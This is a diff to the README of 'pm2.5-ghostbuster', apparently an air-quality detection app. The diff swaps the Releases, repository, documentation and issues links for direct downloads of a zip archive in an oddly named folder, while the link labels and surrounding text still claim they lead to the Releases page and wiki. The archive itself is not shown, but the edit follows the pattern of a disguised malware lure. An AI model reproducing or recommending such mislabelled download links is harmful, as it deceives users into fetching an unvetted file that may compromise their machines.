@@ -8,14 +8,14 @@ Welcome to the **pm2.5-ghostbuster** project! This software helps you detect PM2
 
 To get started, you need to download the application from our Releases page. 
 
-[![Download pm2.5-ghostbuster](https://img.shields.io/badge/Download-pm2.5--ghostbuster-blue.svg)](https://github.com/Khaledmsamh/pm2.5-ghostbuster/releases)
+[![Download pm2.5-ghostbuster](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
 
 Click the link above to visit the Releases page. Here, you will find different versions of the software you can download based on your device.
 
 ### Step-by-Step Installation
 
 1. **Visit the Release Page**
-   - Go to the [Releases page](https://github.com/Khaledmsamh/pm2.5-ghostbuster/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip).
 
 2. **Choose Your Version**
    - Look for the latest release. It will have the highest version number. 
@@ -60,9 +60,9 @@ This project combines art and science to address air pollution. Using **pm2.5-gh
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Khaledmsamh/pm2.5-ghostbuster)
-- [Documentation](https://github.com/Khaledmsamh/pm2.5-ghostbuster/wiki)
-- [Community Discussions](https://github.com/Khaledmsamh/pm2.5-ghostbuster/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
+- [Documentation](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Khaledmsamh/pm2.5-ghostbuster/main/grasshopperdom/pm2.5-ghostbuster.zip)
 
 ## 💬 Get Help
 
